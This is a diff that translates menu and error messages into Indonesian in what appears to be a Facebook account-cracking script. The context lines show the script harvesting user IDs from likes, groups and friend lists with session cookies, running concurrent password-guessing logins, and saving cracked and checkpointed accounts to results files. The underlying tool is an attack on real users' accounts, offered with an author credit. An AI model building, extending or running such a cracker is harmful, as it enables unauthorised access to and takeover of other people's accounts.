@@ -114,7 +114,7 @@ def fromlikes(url):
                 aws = getlike(mbasic.format(love))
                 return aws
         except:
-                exit("# cant dump id ")
+                exit("# tidak bisa mengambil ID")
 def getlike(react):
         like = requests.get(react,cookies=kuki).content
         ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
@@ -163,7 +163,7 @@ if __name__ == '__main__':
                 print('┣━ \033[0m[\033[1;32m3\033[0m] Crack dari nama')
                 print('\033[1;91m┣━ \033[0m[\033[1;32m4\033[0m] Crack dari grup ')
                 print('\033[1;91m┣━ \033[0m[\033[1;32m5\033[0m] Crack dari teman')
-                print('\033[1;91m┣━ \033[0m[\033[1;32m6\033[0m] Results check')
+                print('\033[1;91m┣━ \033[0m[\033[1;32m6\033[0m] Cek Results')
                 print('\033[1;91m┗\033[0m\n')
                 print()
                 tanya = input('➛ ')
@@ -230,7 +230,7 @@ if __name__ == '__main__':
                         except FileNotFoundError:
                                 exit("# you not have a results")
                 else:
-                        exit("# wrong choice")
+                        exit("# pilihan salah")
                 print()
                 expass = input("[\033[1;32m>\033[0m] Password tambahan : ")
                 print("# result will be saved in results-life.txt and results-check.txt")
@@ -252,8 +252,8 @@ if __name__ == '__main__':
                                                 ex.submit(login,(users[1]),(passw))
                 if check != 0 or result != 0:
                         print("\n[\033[1;32m✔\033[Selesai bro. file saved in : ")
-                        print("        - life : results-life.txt")
-                        print("        - checkpoint : results-check.txt")
+                        print("        - Succes : results-life.txt")
+                        print("        - Checkpoint : results-check.txt")
                         exit("# Tools author : Moch Bagas Kurniawa")
                 else:
                         print("\n# Done")
